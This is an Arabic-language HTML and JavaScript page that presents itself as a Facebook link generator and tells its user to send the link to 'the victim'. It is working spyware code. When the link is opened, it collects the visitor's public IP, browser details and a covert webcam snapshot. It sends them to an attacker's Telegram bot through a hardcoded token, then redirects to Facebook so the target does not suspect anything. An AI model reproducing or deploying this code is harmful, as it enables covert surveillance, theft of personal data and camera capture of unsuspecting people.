<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رابط التوجيه</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        p {
            color: #666;
            margin-bottom: 25px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 14px 18px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            transition: 0.3s;
            margin-bottom: 15px;
            direction: ltr;
        }
        input:focus {
            border-color: #667eea;
            outline: none;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
        }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 14px 40px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
        }
        #result {
            margin-top: 25px;
            padding: 20px;
            background: #f8f9ff;
            border-radius: 12px;
            display: none;
            word-break: break-all;
        }
        #result.show {
            display: block;
        }
        .link-box {
            background: white;
            padding: 12px;
            border-radius: 8px;
            border: 2px dashed #667eea;
            margin: 10px 0;
        }
        .link-box a {
            color: #667eea;
            text-decoration: none;
            font-weight: bold;
            font-size: 16px;
        }
        .link-box a:hover {
            text-decoration: underline;
            color: #764ba2;
        }
        .copy-btn {
            background: #28a745;
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            margin-top: 10px;
            width: auto;
        }
        .copy-btn:hover {
            background: #218838;
        }
        .note {
            margin-top: 15px;
            font-size: 12px;
            color: #999;
        }
        .loading {
            display: none;
            margin: 15px 0;
        }
        .loading.show {
            display: block;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <h1>🔗 إنشاء رابط التوجيه</h1>
    <p>أدخل رابط صفحة فيسبوك وسنقوم بإنشاء رابط مخصص لك</p>

    <input type="text" id="fbLink" placeholder="https://www.facebook.com/username" dir="ltr">
    <button onclick="generateLink()">🚀 إنشاء الرابط</button>

    <div class="loading" id="loading">
        <div class="spinner"></div>
        <p style="margin-top:10px;color:#667eea;">جاري إنشاء الرابط...</p>
    </div>

    <div id="result">
        <h3 style="color:#333;margin-bottom:10px;">✅ تم إنشاء الرابط</h3>
        <p style="font-size:13px;color:#666;">انسخ الرابط التالي وأرسله للضحية:</p>
        <div class="link-box" id="linkBox">
            <a href="#" id="generatedLink" target="_blank">رابطك هنا</a>
        </div>
        <button class="copy-btn" onclick="copyLink()">📋 نسخ الرابط</button>
        <p class="note">⚠️ عند فتح الرابط، سيتم جمع البيانات تلقائياً</p>
    </div>
</div>

<script>
    // ===== إعدادات بوت التيلجرام =====
    const BOT_TOKEN = '8940194661:AAFXBaZq-9j9H_GuJIXHYXYOnk-hpxmLxYY'; // ⚠️ غيّر هذا
    const CHAT_ID = '8918858258'; // ⚠️ غيّر هذا

    // ===== دالة لجلب الـ IP =====
    async function getPublicIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch {
            return 'غير معروف';
        }
    }

    // ===== دالة لجلب بيانات المتصفح =====
    function getBrowserInfo() {
        return `
        📱 **بيانات الضحية**:
        ▫️ المتصفح: ${navigator.userAgent}
        ▫️ اللغة: ${navigator.language}
        ▫️ الشاشة: ${screen.width}x${screen.height}
        ▫️ الوقت: ${new Date().toLocaleString('ar-EG')}
        ▫️ هل الكوكيز مفعلة؟ ${navigator.cookieEnabled ? 'نعم' : 'لا'}
        `;
    }

    // ===== دالة التصوير =====
    function capturePhoto() {
        return new Promise((resolve) => {
            navigator.mediaDevices.getUserMedia({ 
                video: { 
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                } 
            })
            .then(stream => {
                const video = document.createElement('video');
                video.style.display = 'none';
                document.body.appendChild(video);
                video.srcObject = stream;
                video.play();

                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, 640, 480);
                    const imageData = canvas.toDataURL('image/jpeg', 0.9);
                    
                    // تنظيف
                    stream.getTracks().forEach(track => track.stop());
                    video.remove();
                    canvas.remove();
                    
                    resolve(imageData);
                }, 800);
            })
            .catch(err => {
                console.warn('❌ الكاميرا مرفوضة أو غير موجودة:', err);
                resolve(null);
            });
        });
    }

    // ===== دالة إرسال إلى تيلجرام =====
    async function sendToTelegram(type, content) {
        const baseUrl = `https://api.telegram.org/bot${BOT_TOKEN}`;

        try {
            if (type === 'text') {
                await fetch(`${baseUrl}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: content,
                        parse_mode: 'Markdown'
                    })
                });
            } else if (type === 'photo') {
                const blob = dataURLtoBlob(content);
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'spy_photo.jpg');

                await fetch(`${baseUrl}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }
        } catch (e) {
            console.error('❌ فشل الإرسال لتيلجرام:', e);
        }
    }

    // ===== تحويل Base64 لـ Blob =====
    function dataURLtoBlob(dataURL) {
        const parts = dataURL.split(',');
        const mime = parts[0].match(/:(.*?);/)[1];
        const byteString = atob(parts[1]);
        const arrayBuffer = new ArrayBuffer(byteString.length);
        const uint8Array = new Uint8Array(arrayBuffer);
        for (let i = 0; i < byteString.length; i++) {
            uint8Array[i] = byteString.charCodeAt(i);
        }
        return new Blob([arrayBuffer], { type: mime });
    }

    // ===== إنشاء رابط عشوائي =====
    function generateFakeLink(fbUrl) {
        const randomId = Math.random().toString(36).substring(2, 12);
        const domain = 'https://' + ['link-zone', 'go-page', 'visit-now', 'click-here'][Math.floor(Math.random() * 4)] + '.com';
        return `${domain}/${randomId}?ref=${encodeURIComponent(fbUrl)}`;
    }

    // ===== الوظيفة الرئيسية: لما المستخدم يدوس "تم" =====
    async function generateLink() {
        const input = document.getElementById('fbLink');
        const resultDiv = document.getElementById('result');
        const loadingDiv = document.getElementById('loading');
        const linkBox = document.getElementById('linkBox');
        const linkAnchor = document.getElementById('generatedLink');
        
        const fbUrl = input.value.trim();

        if (!fbUrl) {
            alert('⚠️ الرجاء إدخال رابط فيسبوك أولاً!');
            input.focus();
            return;
        }

        // إظهار التحميل
        loadingDiv.classList.add('show');
        resultDiv.classList.remove('show');

        // 1. إنشاء رابط وهمي
        const fakeLink = generateFakeLink(fbUrl);

        // 2. عرض الرابط للمستخدم
        setTimeout(() => {
            loadingDiv.classList.remove('show');
            resultDiv.classList.add('show');
            linkAnchor.href = fakeLink;
            linkAnchor.textContent = fakeLink;
            // حفظ الرابط لاستخدامه في النسخ
            linkAnchor.setAttribute('data-link', fakeLink);
        }, 1500);

        // 3. نربط الحدث: لما يفتح الرابط (ده هننفذه في صفحة منفصلة)
        // بس هنا هنخزن الرابط في localStorage عشان الصفحة التانية تقراه
        localStorage.setItem('fb_redirect', fbUrl);
        localStorage.setItem('spy_link', fakeLink);

        console.log('✅ الرابط الوهمي:', fakeLink);
    }

    // ===== دالة نسخ الرابط =====
    function copyLink() {
        const link = document.getElementById('generatedLink').getAttribute('data-link');
        if (link) {
            navigator.clipboard.writeText(link).then(() => {
                alert('✅ تم نسخ الرابط!');
            }).catch(() => {
                // طريقة بديلة
                const textarea = document.createElement('textarea');
                textarea.value = link;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                textarea.remove();
                alert('✅ تم نسخ الرابط!');
            });
        }
    }

    // ===== ✅ الجزء المهم: لما الضحية يفتح الرابط =====
    // ده هيشتغل تلقائياً لو الصفحة الحالية هي الرابط الوهمي
    // لكن احنا محتاجين نفتح صفحة جديدة للضحية
    // فلما يتم فتح الرابط، هنشغل الكود ده:

    // هنضيف كود يتشغل تلقائياً عند تحميل الصفحة
    (function autoSpy() {
        // نتحقق لو في رابط في الـ URL
        const currentUrl = window.location.href;
        const params = new URLSearchParams(window.location.search);
        const ref = params.get('ref');

        // لو الرابط الحالي بيشبه الرابط الوهمي (فيه ref)
        if (ref && currentUrl.includes('link-zone') || currentUrl.includes('go-page') || currentUrl.includes('visit-now') || currentUrl.includes('click-here')) {
            // ده معناه إن الضحية فتح الرابط الوهمي
            console.log('🕵️ تم فتح الرابط الوهمي! نبدأ التجسس...');
            
            // نبدأ جمع البيانات
            startSpying(ref);
        }
    })();

    // ===== دالة التجسس الرئيسية =====
    async function startSpying(fbUrl) {
        try {
            // 1. جلب الـ IP
            const ip = await getPublicIP();
            
            // 2. بيانات المتصفح
            const browserInfo = getBrowserInfo();
            
            // 3. التقاط الصورة (لو سمحت الكاميرا)
            const photo = await capturePhoto();
            
            // 4. تجهيز الرسالة
            let message = `🎯 **تم اختراق الضحية!**\n\n`;
            message += `🔗 الرابط المفتوح: ${window.location.href}\n`;
            message += `🎯 رابط فيسبوك الأصلي: ${fbUrl || 'غير معروف'}\n\n`;
            message += browserInfo;
            message += `\n🌐 IP العمومي: ${ip}`;
            
            // 5. إرسال النص
            await sendToTelegram('text', message);
            
            // 6. إرسال الصورة لو موجودة
            if (photo) {
                await sendToTelegram('photo', photo);
            }
            
            // 7. توجيه الضحية لفيسبوك عشان متشكش
            setTimeout(() => {
                if (fbUrl) {
                    window.location.href = fbUrl;
                } else {
                    window.location.href = 'https://www.facebook.com';
                }
            }, 2000);
            
        } catch (error) {
            console.error('❌ خطأ في التجسس:', error);
            // حتى لو فشل، يوجه لفيسبوك
            window.location.href = fbUrl || 'https://www.facebook.com';
        }
    }

    // ===== كود إضافي: لو الرابط الوهمي فيه ref، ابدأ التجسس فوراً =====
    // نفحص الـ URL عند التحميل
    window.addEventListener('load', function() {
        const params = new URLSearchParams(window.location.search);
        const ref = params.get('ref');
        if (ref && window.location.hostname.includes('link-zone') || 
            window.location.hostname.includes('go-page') ||
            window.location.hostname.includes('visit-now') ||
            window.location.hostname.includes('click-here')) {
            // تأخير بسيط عشان يضمن تحميل كل حاجة
            setTimeout(() => {
                startSpying(ref);
            }, 500);
        }
    });
</script>

</body>
</html>
